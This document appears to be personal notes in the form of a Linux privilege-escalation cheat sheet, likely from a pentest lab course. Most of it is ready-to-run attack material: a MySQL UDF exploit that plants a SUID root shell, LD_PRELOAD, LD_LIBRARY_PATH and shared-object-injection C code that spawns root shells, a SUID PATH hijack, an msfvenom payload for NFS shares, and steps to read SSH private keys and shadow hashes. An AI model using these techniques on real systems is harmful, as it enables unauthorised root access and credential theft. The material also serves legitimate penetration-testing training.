# Checklist
- [ ] bash_history
- [ ] /var/www/html/config.php
- [ ] See if we can read files under .ssh directory
  - [ ] /home/user/.ssh/id_rsa
  - [ ] /root/.ssh/id_rsa
- [ ] See if we can write our public key
  - [ ] /home/user/.ssh/authorized_keys
- [ ] Kernal Exploit: check windows version
- [ ] Vulnerable Software: dpkg -l
- [ ] User Privileges: sudo -l
- [ ] User Privileges: SUID
- [ ] Scheduled Tasks
  - [ ] See if we can add/write cronjob
  - /etc/crontab
  - /etc/cron.d
  - /var/spool/cron/crontabs/root


# Kernel Exploits
```bash
# enumerate kerner version
uname -a
# find matching exploits
searchsploit linux kernel 2.6.xx priv esc

# the best thing to do is to use "linux exploit suggester"
linux-exploit-suggester-2.pl –k 2.6.32
```

# Service Exploits
```bash
# first let's get all the process running as root
ps aux | grep "^root"

# find out the version number
<program> -v

# On Debian-like distributions, dpkg can show installed programs and their version:
dpkg -l | grep <program>

# MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
/tmp/rootbash -p

# In some instances, a root process may be bound to an internal port, 
through which it communicates.
ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
```

# Weak File Permission
```bash
# create a password hash(for /etc/shadow file)
mkpasswd -m sha-512 newpasswordhere

# create a paswword hash(for /etc/passwd file)
openssl passwd newpasswordhere
```

# backups
```bash
# Check these directories
user home directory
/
/tmp
/var/backups
```

# sudo
```bash
# To run as a specific user
sudo -u username program

# If su program is not allowed
sudo -s
sudo -i
sudo /bin/bash
sudo passwd

# apache2
sudo apache2 -f /etc/shadow
```

# sudo - environment variables
```bash
#. Check which environment variables are inherited (look for the env_keep options):
#. LD_PRELOAD loads a shared object before any others when a program is run.
==================================# preload.c==================================
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setresuid(0,0,0);
system("/bin/bash -p");
}
===============================================================================

1. Create a shared object using the code located at /home/user/tools/sudo/preload.c:
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
2. Run one of the programs you are allowed to run via sudo (listed when running sudo -l),
while setting the LD_PRELOAD environment variable to the full path of the new shared object:
sudo LD_PRELOAD=/tmp/preload.so program-name-here

# LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
1. The ldd command can be used to print the shared libraries used by a program
ldd /usr/sbin/apache2

linux-vdso.so.1 => (0x00007fff063ff000)
...
libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7d4199d000)
libdl.so.2 => /lib/libdl.so.2 (0x00007f7d41798000)
libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7d41570000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7d42e84000)


2. Hijacking shared objects using this method is hit or miss. Choose one from 
the list and try it (libcrypt.so.1 seems to work well).

3. Create a file (library_path.c) with the following contents:
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}

4. Compile library_path.c into libcrypt.so.1
gcc -o libcrypt.so.1 -shared -fPIC library_path.c

5. run!
sudo LD_LIBRARY_PATH=. apache2
```

# cron
```bash
# User crontabs location
/var/spool/cron/
/var/spool/cron/crontabs/

# The system-wide crontab location
/etc/cron*
/etc/crontab
```

# cron - PATH Environment Variable
```bash
# The crontab PATH environment variable is by default set to 
/usr/bin:/bin

# If a cron job program/script does not use an absolute path, and one 
# of the PATH directories is writable by our user, we may be able to 
# create a program/script with the same name as the cron job
```

# Files to lookup for passwords
```bash
# history files
_history..

# config files
.ovpn

```

# NFS
```bash
# configuration location
/etc/exports

# Show
showmount -e <target>

# Mount an NFS share
mkdir /tmp/nfs
mount -o rw,vers=2 <target>:<share> <local_directory>

# Using the root user on your local machine, generate a payload and save it to the mounted share
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o
chmod +xs /tmp/nfs/shell.elf

```

# SUID
```bash
# locate files with the SUID or SGID bits set
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

# SUID - Shared Object Injection
```bash
1. By using a program called strace, we can track these system calls and determine whether any shared objects were not found.
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
2. Create the file(missing library)
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
setuid(0);
system("/bin/bash -p");
}

3. Compile libcalc.c
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c

4. Run the SUID executable to get a root shell:

```

# SUID - PATH Environment Variable
```bash
1. Find SUID/SGID files on the target:
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

2. Run strings on the SUID file
strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
...
service apache2 start
3. The file is trying to run the 'service' program without a full path
strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service

4. create a file service.c with the following contents:
int main() {
setuid(0);
system("/bin/bash -p");
}

5. Compile service.c into a file called service:
gcc -o service service.c

6. Prepend the current directory (or where the new service
executable is located) to the PATH variable, and execute the SUID 
file for a root shell

PATH=.:$PATH /usr/local/bin/suid-env
```


# Finding Vulnerable Programs
```bash
# If a program tries to execute another program, the name of that 
# program is likely embedded in the executable file as a string

```

